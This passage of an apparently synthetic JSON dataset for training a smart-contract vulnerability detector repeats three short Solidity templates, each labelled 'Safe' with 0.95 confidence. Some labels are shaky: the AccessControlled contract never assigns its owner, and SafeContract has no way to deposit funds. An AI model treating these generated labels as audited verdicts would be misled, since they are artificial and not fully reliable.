    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 392",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 393",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 394",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 395",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 396",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 397",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 398",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 399",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 400",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 401",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 402",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 403",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 404",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 405",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 406",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 407",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 408",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 409",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 410",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 411",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 412",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 413",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 414",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 415",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 416",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 417",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 418",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 419",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 420",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 421",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
